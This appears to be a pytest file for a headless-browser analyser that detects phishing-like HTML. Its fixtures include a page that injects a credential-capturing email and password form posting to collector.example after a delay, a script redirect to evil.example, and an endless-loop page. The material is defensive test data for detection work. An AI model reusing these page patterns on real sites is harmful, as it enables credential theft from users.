"""ТЗ 4.1.4.2 / ПМИ А-5: итоговый DOM после выполнения сценариев (динамическая вставка, отложенная загрузка)."""
import pytest

from browser import BrowserController, _playwright_available
from dispatch import parse_file_bytes

pytestmark = pytest.mark.skipif(not _playwright_available(), reason="Chromium (Playwright) is not installed")

DELAYED = b"""<html><head><title>Loading</title></head><body><p>Please wait...</p>
<script>
setTimeout(function () {
  document.body.innerHTML = '<form action="https://collector.example/post" method="post">' +
    '<input type="email" name="u"><input type="password" name="p"></form>' +
    '<a href="https://inserted.example/login">Sign in</a>';
}, 200);
</script></body></html>"""

REDIRECT = b"""<html><body><script>setTimeout(function () { window.location.href = 'https://evil.example/landing'; }, 150);</script>
<button onclick="window.open('https://popup.example/x')">Open</button></body></html>"""

STATIC = b"<html><body><h1>Hello</h1><p>Static page</p></body></html>"


def _parse(payload):
    return parse_file_bytes(payload, "page.html", BrowserController())


def test_delayed_form_and_inserted_link_are_extracted():
    parsed = _parse(DELAYED)
    assert parsed["scripts_executed"]
    assert parsed["has_password_field"] and parsed["forms_count"] >= 1
    assert "https://inserted.example/login" in parsed["links"]
    assert parsed["dynamic_added"]["forms"] >= 1
    assert "[после выполнения сценариев]" in " ".join(parsed["evidence_snippets"].values()) or parsed["dynamic_added"]["links"] >= 1


def test_script_navigation_is_recorded_not_followed():
    parsed = _parse(REDIRECT)
    assert "https://evil.example/landing" in parsed.get("script_requests", [])
    assert "https://evil.example/landing" in parsed["links"]


def test_static_page_is_unchanged_by_script_execution():
    parsed = _parse(STATIC)
    assert parsed["scripts_executed"] and parsed["forms_count"] == 0 and not parsed.get("script_requests")
    assert parsed["dynamic_added"] == {"forms": 0, "links": 0}


def test_endless_script_does_not_hang_the_analysis():
    import time
    t0 = time.time()
    parsed = _parse(b"<html><body><form><input type=password></form><script>while(true){}</script></body></html>")
    assert time.time() - t0 < 40
    assert parsed["has_password_field"]  # the static features survive a failed render
